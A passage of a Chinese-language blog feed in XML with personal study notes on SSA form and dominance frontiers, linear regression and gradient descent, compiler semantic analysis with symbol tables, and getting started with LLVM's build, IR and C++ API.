    <content type="html"><![CDATA[<h1 id="SSA-Form"><a href="#SSA-Form" class="headerlink" title="SSA Form"></a>SSA Form</h1><p>SSA 全称是 Static Single Assignment Form 即静态单赋值形式，LLVM 就采用了 SSA Form，当然 LLVM 处理 SSA 的过程是透明的，生成 LLVM IR 的时候只需要处理好 Basic Block 之间的关系，LLVM 就会自动将 IR 转换成 SSA Form。然而对于布尔短路，则需要自己实现 SSA 过程。</p><p>简单讲，SSA 形式只允许一个变量被赋值一次，这叫单赋值。程序中存在循环结构，循环结构可能被动态执行多次，循环结构中的变量仍然可能被重新赋值，所以称为“静态单赋值”而不是简单的“单赋值”。</p><p>好处是，def-use china 更简洁，有利于数据流分析和优化，等。</p><p>当两个控制流汇聚在一起，如何保证变量只赋值一次呢？为了解决这个问题，引入了一个虚构函数 $\phi$ 可以用 $a_3:=\phi(a_1, a_2)$ 实现合并。</p><p>$\phi$ 函数自动根据控制流入边选择 $a_1$ 或 $a_2$ 赋值给 $a_3$。$\phi$ 函数底层实现原理是在入边的基本块尾部添加 MOVE 指令。</p><h2 id="转换-SSA-算法"><a href="#转换-SSA-算法" class="headerlink" title="转换 SSA 算法"></a>转换 SSA 算法</h2><p>来搞点理论学习hhhhh</p><p>转换 SSA 最复杂的是如何添加 $\phi$ 函数。最简单的做法是在汇聚点为每一个变量都添加 $\phi$ 函数，但是这样做非常低效。</p><h3 id="Dominance-Relation"><a href="#Dominance-Relation" class="headerlink" title="Dominance Relation"></a>Dominance Relation</h3><ul><li><p>X dominates Y if every path from the start node to Y goes through X </p><p>dominate 就是说 X 是 Y 的必经结点</p></li><li><p>D(X) is the set of nodes that X dominates</p></li><li><p>X strictly dominates Y if X dominates Y and X ≠ Y</p></li><li><p>Dominance Frontier (DF) of node X is the set of all nodes Y such that:</p><ul><li>X dominates a predecessor of Y, and</li><li>X does not strictly dominate Y</li><li>简单讲这个就是边 X 必经结点的边界，DF(X) 中的结点的前驱中有一个是 D(x) 中的结点而另一个前驱就不属于 D(X)。再讲简单一点，DF(X) 中的结点控制流可能经过X，也可能还有其它路径，不经过 X。</li></ul><img src="/2021/02/10/SSA-Form/image-20210210154229191.png" class="" title="image-20210210154229191"><p>如图，D(5) = {6, 7, 8}， DF(5) = {4, 13, 12, 5}</p></li></ul><p>如果一个变量 a 在 X 结点中定义，显而易见，有以下性质： </p><ul><li><p>D(X) 中的结点不需要为 a 变量插入 $\phi$ 函数</p></li><li><p>DF(X) 中的结点需要为 a 变量插入 $\phi$ 函数</p></li></ul><p>这样就避免了添加重复无用的 $\phi$ 函数。</p><h3 id="DF-X-的计算"><a href="#DF-X-的计算" class="headerlink" title="DF(X) 的计算"></a>DF(X) 的计算</h3><p>这个是一个递归计算算法，DF(X) 计算子结点的 DF(X) 合并。</p><p>DF(X) 需要的辅助函数</p><ul><li><p>Local(X) := set of successors of X that X does not immediately dominate</p><ul><li>个人理解就是， X 的子结点中，X 无法直接 dominate 的结点（这些结点前驱除了X还有其它的前驱）</li></ul></li><li><p>Up(X) := if X dominates K, Up(X) is the set of nodes in DF(K) that are not dominated by X.</p></li><li><p>个人理解就是，X 的子节点 K 的 DF(K )集合中不属于 D(X)  的结点，可以理解成子节点的边界。。（突然发现人话好难描述。。）</p></li><li><p>$DF(X) = Local(X) \cup \bigcup\limits_{c \in children[X]}Up(X)$  </p></li></ul><p>  算法描述</p>  <img src="/2021/02/10/SSA-Form/image-20210210155947398.png" class="" title="image-20210210155947398"><h3 id="插入-phi-函数"><a href="#插入-phi-函数" class="headerlink" title="插入 $\phi$ 函数"></a>插入 $\phi$ 函数</h3><p>每次插入 $\phi$ 函数都会引入新的定义，所以要迭代不停检查DF，直到没有新的 $\phi$ 插入。</p><p>举个例子。</p><img src="/2021/02/10/SSA-Form/image-20210210161240739.png" class="" title="image-20210210161240739"><p>DF(5) = {6}, 在 6 结点为 W 插入 $\phi$ 函数</p><p>DF(6) = {7}, 在 7 结点为 W 插入 $\phi$ 函数</p><h3 id="重命名变量名"><a href="#重命名变量名" class="headerlink" title="重命名变量名"></a>重命名变量名</h3><p>用脚标对同一个变量命名区分。</p>]]></content>
    
    
    <categories>
      
      <category>compiler</category>
      
    </categories>
    
    
    <tags>
      
      <tag>note</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Ml1: Linear Regression</title>
    <link href="/2021/02/08/Ml1-Linear-Regression/"/>
    <url>/2021/02/08/Ml1-Linear-Regression/</url>
    
    <content type="html"><![CDATA[<h1 id="Linear-Regression"><a href="#Linear-Regression" class="headerlink" title="Linear Regression"></a>Linear Regression</h1><p>寒假无聊，就打算学习机器学习。</p><p>课程地址: <a href="https://www.bilibili.com/video/BV164411b7dx?p=1">https://www.bilibili.com/video/BV164411b7dx?p=1</a></p><p>学习机器学习的过程中，第一个要学的算法就是线性回归。通过学习线性回归算法，可以了解到机器学习中的监督学习(Supervised Learning) 基本流程。高中数学课程已经讲过线性回归，但是仅仅是给出了计算公式，其中的原理从没有讲过。</p><h2 id="单变量线性回归-Linear-Regression-with-One-Variable"><a href="#单变量线性回归-Linear-Regression-with-One-Variable" class="headerlink" title="单变量线性回归(Linear Regression with One Variable)"></a>单变量线性回归(Linear Regression with One Variable)</h2><h3 id="模型表示"><a href="#模型表示" class="headerlink" title="模型表示"></a>模型表示</h3><p>课程以预测房子价格为例子，目的是使用给定的数据集训练模型，使该模型能够预测房子价格。该例子只有一个变量即房子的面积。</p><p>训练集如下图：</p><img src="/2021/02/08/Ml1-Linear-Regression/image-20210208163559117.png" class="" title="image-20210208163559117"><p>面积与价格之间存在某种线性关系，如下图</p><img src="/2021/02/08/Ml1-Linear-Regression/image-20210208164119842.png" class="" title="image-20210208164119842"><p>我们把这种线性关系假设为一个<strong>hypothesis</strong> 即 $h_\theta(x) = \theta_0 + \theta_1x$</p><p>模型如下图：</p><img src="/2021/02/08/Ml1-Linear-Regression/image-20210208163722563.png" class="" title="image-20210208163722563"><p>h 代表的是 <strong>hypothesis</strong> ，即 $h_\theta(x) = \theta_0 + \theta_1x$  。 Learning Algorithm 的作用是用 Training Set 中的数据求出满足要求的 $\theta_0$ 和 $\theta_1$</p><h3 id="一些符号定义"><a href="#一些符号定义" class="headerlink" title="一些符号定义"></a>一些符号定义</h3><p> $m$ 代表训练集中实例的数量</p><p> $x$ 代表特征/输入变量</p><p> $y$ 代表目标变量/输出变量</p><p> $(x,y)$ 代表训练集中的实例</p><p> $(x^{(i)},y^{(i)})$ 代表第 $i$ 个观察实例</p><h3 id="代价函数-cost-function"><a href="#代价函数-cost-function" class="headerlink" title="代价函数 cost function"></a>代价函数 cost function</h3><p>如何选择 $h_\theta(x) = \theta_0 + \theta_1x$ 中的  $\theta_0$ 和 $\theta_1$ 参数，使得 h 可以很好的预测呢？ </p><p>这时候就引入 cost function 来表示假设函数与真实数据（训练集中的数据）之间的差异。训练的目的就找到合适的参数，使代价函数的值最小化。</p><p>这个例子中代价函数定义 : $J(\theta_1,\theta_2) = \frac{1}{2m}\sum\limits_{i=1}^{m}{(h_\theta(x^{(i)})-y^{(i)})^2}$</p><p>代价函数的图像</p><img src="/2021/02/08/Ml1-Linear-Regression/image-20210208170439473.png" class="" title="image-20210208170439473"><p>通过该图，可以找到一个代价函数的最小点对应的参数值。训练的目的就是找到代价函数最小值对应的参数，这样假设函数计算值与训练集之间的差异就很小。</p><h3 id="梯度下降法-Gradient-Descent-最小化代价函数"><a href="#梯度下降法-Gradient-Descent-最小化代价函数" class="headerlink" title="梯度下降法 (Gradient Descent) 最小化代价函数"></a>梯度下降法 (Gradient Descent) 最小化代价函数</h3><p>类似爬山一样，我可能在山上的任意一个位置，我要如何走才能到山底呢？</p><p>梯度下降法就是一种最小化代价函数的算法，梯度下降背后的思想是：开始时我们随机选择一个参数的组合 $(\theta_1,\theta_2,……,\theta_n)$，计算代价函数，然后我们寻找下一个能让代价函数值下降最多的参数组合。我们持续这么做直到到到一个局部最小值（<strong>local minimum</strong>），因为我们并没有尝试完所有的参数组合，所以不能确定我们得到的局部最小值是否便是全局最小值（<strong>global minimum</strong>），选择不同的初始参数组合，可能会找到不同的局部最小值。</p><img src="/2021/02/08/Ml1-Linear-Regression/image-20210208171537998.png" class="" title="image-20210208171537998"><p>用数学语言表达下降的一步就是</p><p>$\theta_0 := \theta_0 - \alpha\frac{\delta}{\delta\theta_0}J(\theta_0,\theta_1)$</p><p>$\theta_1 := \theta_1 - \alpha\frac{d}{d\theta_1}J(\theta_0,\theta_1)$</p><p>其中 $\alpha$ 是学习率，如果学习率太小，下降的速度就太慢了，如果学习率过大，可能就错过最小值。</p><p>每一步下降，参数值减去学习率乘代价函数的导数。</p><p>为了进一步理解下降的过程，考虑代价函数只有一个参数，代价函数的图像类似一个二次函数</p><img src="/2021/02/08/Ml1-Linear-Regression/image-20210208172952759.png" class="" title="image-20210208172952759"><p>如图点 $\theta_1$ 对应函数值点处的导数，是一个正导数，即 $h’(\theta_1) &gt; 0$，为了达到局部最小值，需要向左移动。 因此 $\theta_1$ 应该减去一个正数乘以 $\alpha$。导数项的作用之一就是确定 $\theta_1$ 更新的方向。通过多次迭代更新 $\theta$ 的过程，一直到收敛。</p><p>$\alpha$ 是学习率，作为导数项的系数，控制下降的步伐，如果太小，则迭代次数增加，如果太大，则可能直接错过最优解，甚至无法收敛。</p><p>迭代过程中，越接近 J 的最小值，导数项的值越小，即收敛。</p><p>该例子中的梯度下降完整描述</p><img src="/2021/02/08/Ml1-Linear-Regression/image-20210208174119804.png" class="" title="image-20210208174119804"><p>注意 $\theta$ 参数的更新是<strong>同时</strong>进行，如下图</p><img src="/2021/02/08/Ml1-Linear-Regression/image-20210208174236545.png" class="" title="image-20210208174236545"><h3 id="线性回归中的梯度下降"><a href="#线性回归中的梯度下降" class="headerlink" title="线性回归中的梯度下降"></a>线性回归中的梯度下降</h3><p>主要是要求出代价函数的导数，多个变量求导，就是偏导数</p><p>偏导数学习：</p><p><a href="https://www.bilibili.com/video/BV1sW411775X?from=search&amp;seid=5642399025096029476">https://www.bilibili.com/video/BV1sW411775X?from=search&amp;seid=5642399025096029476</a></p><p><a href="https://blog.csdn.net/qq_40241957/article/details/102659982">https://blog.csdn.net/qq_40241957/article/details/102659982</a></p><p>$\frac{d}{\delta\theta_j}J(\theta_0,\theta_1) = \frac{\delta}{\delta\theta_j}\frac{1}{2m}\sum\limits_{i=1}^{m}{(h_\theta(x^{(i)})-y^{(i)})^2}$</p><p>当 j = 0 时: $\frac{\delta}{\delta\theta_0}J(\theta_0,\theta_1) = \frac{1}{m}\sum\limits_{i=1}^{m}{(h_\theta(x^{(i)})-y^{(i)})}$</p><p>当 j = 1 时: $\frac{\delta}{\delta\theta_1}J(\theta_0,\theta_1) = \frac{1}{m}\sum\limits_{i=1}^{m}{((h_\theta(x^{(i)})-y^{(i)})·x^{(i)})}$</p><p>重复上述过程得到批量梯度下降算法。</p><h3 id="正规方程-normal-equation-求代价函数最小"><a href="#正规方程-normal-equation-求代价函数最小" class="headerlink" title="正规方程(normal equation)求代价函数最小"></a>正规方程(normal equation)求代价函数最小</h3><p>留个坑，目前还看不懂正规方程的推导过程。</p><p>$\theta = (X^TX)^{-1}X^Ty$</p><p>涉及到矩阵乘法，维数大了之后运算会很慢。</p><h2 id="多变量线性回归"><a href="#多变量线性回归" class="headerlink" title="多变量线性回归"></a>多变量线性回归</h2><p>我们探讨了单变量/特征的回归模型，现在我们对房价模型增加更多的特征，例如房间数楼层等，构成一个含有多个变量的模型，模型中的特征为 $(x_1,x_2,……,x_n)$ </p><p>如图训练集构成一个特征矩阵。</p><img src="/2021/02/08/Ml1-Linear-Regression/image-20210208184430579.png" class="" title="image-20210208184430579"><p>$n$ 代表特征数量</p><p>$x^{(i)}$ 代表第 i 个训练实例，是特征矩阵的第 i 行，是一个列向量</p><p>$x^{(i)}_j$ 代表第 i 行，第 j 个特征</p><p>多变量的假设函数: $h_\theta(x) = \theta_0x_0+\theta_1x_1+…+\theta_nx_n = \theta^TX$</p><p>其中令 $x_0 = 1$ </p><h3 id="多变量梯度下降"><a href="#多变量梯度下降" class="headerlink" title="多变量梯度下降"></a>多变量梯度下降</h3><p>代价函数 $J(\theta1,\theta2,……,\theta_n)=\frac{1}{2m}\sum\limits_{i=1}^{m}(h_\theta(x^{(i)})-y^{(i)})$</p><p>假设函数 $h_\theta(x)=\theta^TX$</p><p>梯度下降算法为:</p><p>Repeat {</p><p>$\theta_j := \theta_j - \alpha\frac{\delta}{\delta\theta_j}J(\theta_1, \theta_2,……,\theta_n)$</p><p>}</p><p>求导后为:</p><p>Repeat {</p><p>$\theta_j := \theta_j - \alpha\frac{1}{m}\sum\limits_{i=1}^{m}((h_\theta(x^{(i)})-y^{(i)})·x^{(i)}_j)$</p><p>}</p><p>Repeat 的意思是循环直到收敛，注意赋值是同时进行。</p><p>over…. 打 latex 太累了。</p><h3 id="梯度下降-特征缩放"><a href="#梯度下降-特征缩放" class="headerlink" title="梯度下降: 特征缩放"></a>梯度下降: 特征缩放</h3><p>就是把特征数据缩放到较小的区间，例如 $[-3, 3]$ 有利于减少迭代次数，更快收敛</p><p>最简单的方法是令 $x_n=\frac{x_n-\mu_n}{s_n}$ 其中 $\mu_n$ 是平均值，$s_n$ 是标准差</p><h3 id="多项式回归"><a href="#多项式回归" class="headerlink" title="多项式回归"></a>多项式回归</h3><img src="/2021/02/08/Ml1-Linear-Regression/image-20210208191303235.png" class="" title="image-20210208191303235"><p>我们可以令</p><p>$x_1=x^0$</p><p>$x_2=x^1$</p><p>$x_3=x^2$</p><p>$x_4=x^3$</p><p>将该模型转化成线性回归模型。</p><p>根据图像的性质，我们可以使</p><p>$h_\theta(x)=\theta_0+\theta_1x+\theta_2x^2$</p><p>或者</p><p>$h_\theta(x)=\theta_0+\theta_1x+\theta_2\sqrt{x}$</p><p>注：如果我们采用多项式回归模型，在运行梯度下降算法前，特征缩放非常有必要。</p><p>最后，还是一个不会写代码的咸鱼，准备这几天找到数据试试。</p>]]></content>
    
    
    <categories>
      
      <category>ml</category>
      
    </categories>
    
    
    <tags>
      
      <tag>note</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Semantic Analysis</title>
    <link href="/2021/02/01/Semantic-Analysis/"/>
    <url>/2021/02/01/Semantic-Analysis/</url>
    
    <content type="html"><![CDATA[<h2 id="语义分析-Semantic-Analysis"><a href="#语义分析-Semantic-Analysis" class="headerlink" title="语义分析 (Semantic Analysis)"></a>语义分析 (Semantic Analysis)</h2><p>语义分析主要检查程序代码语义是否正确。比如标识符是否定义、二元运算的两个操作数的类型是否合法、定义数组的大小是否大于1、函数调用语句是否传递正确的参数等等。另外，语义分析还需要为代码生成阶段收集程序信息，比如确定每一个标识符对应的意义。</p><img src="/2021/02/01/Semantic-Analysis/image-20210201193140519.png" class="" title="image-20210201193140519"><h2 id="实现语义分析"><a href="#实现语义分析" class="headerlink" title="实现语义分析"></a>实现语义分析</h2><ul><li>Attribute Grammars<ul><li>在 parse 阶段检查语义，只需要对输入代码 pass 一遍。</li></ul></li><li>Recursive AST Walk<ul><li>parse 结束后生成 AST，检查 AST 上检查语义，至少需要对输入代码 pass 两遍。</li></ul></li></ul><h2 id="符号表-Symbol-Table"><a href="#符号表-Symbol-Table" class="headerlink" title="符号表 (Symbol Table)"></a>符号表 (Symbol Table)</h2><p>符号表用来把标识符和标识符对应的实体映射起来。</p><ul><li>语义分析过程中，用当前作用域内的信息更新符号表内容。</li><li>经典实现方案 : stack</li><li>符号表的基本操作:<ul><li>Push scope: 进入一个新的作用域</li><li>Pop scope: 离开当前作用域，删除当前作用域内的定义</li><li>Insert symbol: 添加一个符号</li><li>Lookup symbol: 查询符号对应的描述</li></ul></li></ul><h3 id="用-stack-实现符号表"><a href="#用-stack-实现符号表" class="headerlink" title="用 stack 实现符号表"></a>用 stack 实现符号表</h3><p>stack 中每个元素是一个 scope ，进入 scope 的即压栈，退出 scope 即出栈。</p><img src="/2021/02/01/Semantic-Analysis/image-20210201204749509.png" class="" title="image-20210201204749509"><h3 id="Spaghetti-Stack"><a href="#Spaghetti-Stack" class="headerlink" title="Spaghetti Stack"></a>Spaghetti Stack</h3><p>这是另外一种符号表实现方法，没有出栈操作，扫描一遍后可以记录包含整个代码的符号记录。</p><img src="/2021/02/01/Semantic-Analysis/image-20210201203837278.png" class="" title="image-20210201203837278"><img src="/2021/02/01/Semantic-Analysis/image-20210201204602399.png" class="" title="image-20210201204602399"><h2 id="面向对象中继承作用域"><a href="#面向对象中继承作用域" class="headerlink" title="面向对象中继承作用域"></a>面向对象中继承作用域</h2><img src="/2021/02/01/Semantic-Analysis/image-20210201204342263.png" class="" title="image-20210201204342263">]]></content>
    
    
    <categories>
      
      <category>compiler</category>
      
    </categories>
    
    
    <tags>
      
      <tag>note</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>LLVM Practice</title>
    <link href="/2021/01/31/LLVM-Practice/"/>
    <url>/2021/01/31/LLVM-Practice/</url>
    
    <content type="html"><![CDATA[<h1 id="LLVM-Practice"><a href="#LLVM-Practice" class="headerlink" title="LLVM Practice"></a>LLVM Practice</h1><p>Decaf 语言要用 LLVM 作为后端，生成机器代码。我本人对 LLVM 相关的 API 也十分感兴趣。这篇文章记录我学习 LLVM 的过程及相关代码片段。</p><h2 id="编译-LLVM"><a href="#编译-LLVM" class="headerlink" title="编译 LLVM"></a>编译 LLVM</h2><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs vim">git clone http<span class="hljs-variable">s:</span>//github.<span class="hljs-keyword">com</span>/llvm/llvm-project.git<br><span class="hljs-keyword">cd</span> llvm-project<br><span class="hljs-built_in">mkdir</span> build<br><span class="hljs-keyword">cd</span> build<br>cmake -G <span class="hljs-string">&quot;Unix Makefiles&quot;</span> ../llvm<br><span class="hljs-keyword">make</span> -j16<br></code></pre></td></tr></table></figure><p>编译完成后可以在 build/bin 中找到 llvm 相关的 bin 文件。</p><h2 id="如何运行-LLVM-assembly-代码？"><a href="#如何运行-LLVM-assembly-代码？" class="headerlink" title="如何运行 LLVM assembly 代码？"></a>如何运行 LLVM assembly 代码？</h2><p><code>llvm-as</code> 程序将 LLVM assembly 编译成 LLVM bitcode</p><p><code>llc</code> 程序将 LLVM bitcode 编译成 x86 assembly，得到 .s 文件</p><p>LLVM assembly 运行脚本： run-llvm-code.sh</p><p>decaf-stdlib.c 文件封装了 decaf 语言的相关库函数。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sh">llvmconfig=/Users/pandaos/llvm-project/build/bin/llvm-config<br>b=`basename -s .ll <span class="hljs-variable">$1</span>`<br>`<span class="hljs-variable">$llvmconfig</span> --bindir`/llvm-as <span class="hljs-variable">$1</span>  <span class="hljs-comment"># convert LLVM assembly to bitcode</span><br>`<span class="hljs-variable">$llvmconfig</span> --bindir`/llc <span class="hljs-variable">$b</span>.bc   <span class="hljs-comment"># convert LLVM bitcode to x86 assembly</span><br>clang <span class="hljs-variable">$b</span>.s decaf-stdlib.c -o <span class="hljs-variable">$b</span><br>./<span class="hljs-variable">$b</span><br>rm -f <span class="hljs-variable">$b</span>.bc <span class="hljs-variable">$b</span>.s <span class="hljs-variable">$b</span><br></code></pre></td></tr></table></figure><p>使用例子: <code>./run-llvm-code.sh helloworld.ll </code></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-comment">; Declare the string constant as a global constant. </span><br><span class="hljs-comment">; run the following command to run this LLVM assembly program:</span><br><span class="hljs-comment">; sh run-llvm-code.sh helloworld.ll </span><br><span class="hljs-title">@LC0</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">internal</span> <span class="hljs-keyword">constant</span> [<span class="hljs-number">13</span> <span class="hljs-keyword">x</span> <span class="hljs-type">i8</span>] <span class="hljs-keyword">c</span><span class="hljs-string">&quot;hello world\0A\00&quot;</span><br><span class="hljs-comment">; note how the newline character is inserted into the string</span><br><br><span class="hljs-comment">; External declaration of the puts function </span><br><span class="hljs-keyword">declare</span> <span class="hljs-type">i32</span> <span class="hljs-title">@puts</span>(<span class="hljs-type">i8</span>*)<br><br><span class="hljs-comment">; Definition of main function</span><br><span class="hljs-keyword">define</span> <span class="hljs-type">i32</span> <span class="hljs-title">@main</span>() &#123;<br>  <span class="hljs-comment">; Convert [13 x i8]* to i8*</span><br>  <span class="hljs-comment">; this is because the function puts takes a char* which is an i8* in LLVM</span><br>  <span class="hljs-variable">%cast</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">getelementptr</span> [<span class="hljs-number">13</span> <span class="hljs-keyword">x</span> <span class="hljs-type">i8</span>]<span class="hljs-punctuation">,</span> [<span class="hljs-number">13</span> <span class="hljs-keyword">x</span> <span class="hljs-type">i8</span>]* <span class="hljs-title">@LC0</span><span class="hljs-punctuation">,</span> <span class="hljs-type">i8</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span> <span class="hljs-type">i8</span> <span class="hljs-number">0</span><br>  <span class="hljs-comment">; read up on getelementptr: http://llvm.org/docs/GetElementPtr.html</span><br><br>  <span class="hljs-comment">; Call puts function to write out the char* string to stdout. </span><br>  <span class="hljs-keyword">call</span> <span class="hljs-type">i32</span> <span class="hljs-title">@puts</span>(<span class="hljs-type">i8</span>* <span class="hljs-variable">%cast</span>)<br>  <span class="hljs-keyword">ret</span> <span class="hljs-type">i32</span> <span class="hljs-number">0</span> <br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="CMake-项目中嵌入-LLVM-库"><a href="#CMake-项目中嵌入-LLVM-库" class="headerlink" title="CMake 项目中嵌入 LLVM 库"></a>CMake 项目中嵌入 LLVM 库</h2><p>Clion 使用 CMake 作为项目的构建工具，使用 CMake 引用 LLVM 非常方便。</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cmake"><span class="hljs-comment"># llvm settings.</span><br><span class="hljs-keyword">set</span>(LLVM_DIR /Users/pandaos/llvm-<span class="hljs-keyword">project</span>/build/lib/cmake/llvm) <span class="hljs-comment"># 默认安装则不用设置 LLVM_DIR</span><br><span class="hljs-keyword">find_package</span>(LLVM REQUIRED CONFIG)<br><span class="hljs-keyword">message</span>(STATUS <span class="hljs-string">&quot;Found LLVM $&#123;LLVM_PACKAGE_VERSION&#125;&quot;</span>)<br><span class="hljs-keyword">message</span>(STATUS <span class="hljs-string">&quot;Using LLVMConfig.cmake in: $&#123;LLVM_DIR&#125;&quot;</span>)<br><span class="hljs-keyword">include_directories</span>(<span class="hljs-variable">$&#123;LLVM_INCLUDE_DIRS&#125;</span>)<br><span class="hljs-keyword">add_definitions</span>(<span class="hljs-variable">$&#123;LLVM_DEFINITIONS&#125;</span>)<br><span class="hljs-keyword">add_executable</span>(llvm_test main.cpp) <span class="hljs-comment"># llvm_test 是 project name</span><br><span class="hljs-comment"># Link against LLVM libraries</span><br><span class="hljs-keyword">target_link_libraries</span>(llvm_test <span class="hljs-variable">$&#123;llvm_libs&#125;</span>)<span class="hljs-comment"># llvm_test 是 project name</span><br><br></code></pre></td></tr></table></figure><h2 id="LLVM-C-API"><a href="#LLVM-C-API" class="headerlink" title="LLVM C++ API"></a>LLVM C++ API</h2><p>这一部分主要是如何利用 LLVM API 生成中间代码。</p><h3 id="头文件"><a href="#头文件" class="headerlink" title="头文件"></a>头文件</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">llvm<span class="hljs-regexp">/IR/</span>DerivedTypes.h<br>llvm<span class="hljs-regexp">/IR/</span>LLVMContext.h<br>llvm<span class="hljs-regexp">/IR/</span>Module.h<br>llvm<span class="hljs-regexp">/IR/</span>Type.h<br>llvm<span class="hljs-regexp">/IR/</span>Verifier.h<br>llvm<span class="hljs-regexp">/IR/</span>IRBuilder.h<br></code></pre></td></tr></table></figure><h3 id="TheModule"><a href="#TheModule" class="headerlink" title="TheModule"></a>TheModule</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// this global variable contains all the generated code</span><br><span class="hljs-keyword">static</span> llvm::Module *TheModule;<br><span class="hljs-keyword">static</span> llvm::LLVMContext TheContext;<br><span class="hljs-comment">// this is the method used to construct the LLVM intermediate code (IR)</span><br><span class="hljs-keyword">static</span> llvm::IRBuilder&lt;&gt; Builder(TheContext);<br><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    TheModule = <span class="hljs-keyword">new</span> llvm::Module(<span class="hljs-string">&quot;test1&quot;</span>, TheContext);<br>    <span class="hljs-comment">// ......</span><br>    TheModule-&gt;print(llvm::errs(), <span class="hljs-literal">nullptr</span>); <span class="hljs-comment">// standard error</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>TheModule 里面有所有生成的代码，用下面这种方法可以打印</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++">TheModule-&gt;print(llvm::outs(), <span class="hljs-literal">nullptr</span>); <span class="hljs-comment">// standard output</span><br>TheModule-&gt;print(llvm::errs(), <span class="hljs-literal">nullptr</span>); <span class="hljs-comment">// standard error</span><br></code></pre></td></tr></table></figure><h3 id="LLVM-Value"><a href="#LLVM-Value" class="headerlink" title="LLVM Value"></a>LLVM Value</h3><p>LLVM 中的 types, constants, functions 这些都是从 <code>llvm:Value</code> 继承而来。yacc 中，action 之间的数据传递可以用 <code>llvm:Value *</code>。具体使用某一个数据时，可以重新转换成具体的类型，例如<code>llvm:Function*</code>。</p><h3 id="LLVM-Types"><a href="#LLVM-Types" class="headerlink" title="LLVM Types"></a>LLVM Types</h3><table><thead><tr><th>Type</th><th><code>llvm::Type*</code></th><th>Explanation</th></tr></thead><tbody><tr><td>void</td><td>Builder.getVoidTy()</td><td>just a void type</td></tr><tr><td>int</td><td>Builder.getInt32Ty()</td><td>assume 32 bit integers</td></tr><tr><td>bool</td><td>Builder.getInt1Ty()</td><td>a one bit integer</td></tr><tr><td>string</td><td>Builder.getInt8PtrTy()</td><td>pointer to array of bytes (int8)</td></tr></tbody></table><h3 id="LLVM-Constant"><a href="#LLVM-Constant" class="headerlink" title="LLVM Constant"></a>LLVM Constant</h3><p><code>llvm::Constant*</code></p><p>Int32: Builder.getInt32(0)</p><p>bool: Builder.getInt1(0)</p><h3 id="Stack-上分配变量"><a href="#Stack-上分配变量" class="headerlink" title="Stack 上分配变量"></a>Stack 上分配变量</h3><p>一般情况，局部变量都是存储在栈上的。<code>CreateAlloca</code> 在当前插入点创建一个变量，而不是在 Block 入口点创建。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++">llvm::AllocaInst *Alloca;<br><span class="hljs-comment">// unlike CreateEntryBlockAlloca the following will</span><br><span class="hljs-comment">// create the alloca instr at the current insertion point </span><br><span class="hljs-comment">// rather than at the start of the block</span><br>Alloca = llvm::Builder.CreateAlloca(llvm::IntegerType::get(TheContext, <span class="hljs-number">32</span>), <span class="hljs-number">0</span>, <span class="hljs-string">&quot;variable_name&quot;</span>);<br></code></pre></td></tr></table></figure><p><code>Alloca-&gt;getType()</code> 获取类型</p><p>类型检查：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">const</span> llvm::PointerType *ptrTy = rvalue-&gt;getType()-&gt;getPointerTo();<br><span class="hljs-keyword">if</span> (ptrTy == Alloca-&gt;getType()) .... ;<br><br></code></pre></td></tr></table></figure><p>是不是感觉写法很奇怪？这是因为 <code>Alloca</code> 的类型是实际类型的指针类型。比如我在栈上分配一个int变量，CreateAlloca 返回的是一个 int * </p><p>赋值</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++">llvm::Value *val = Builder.CreateStore(rvalue, Alloca); <span 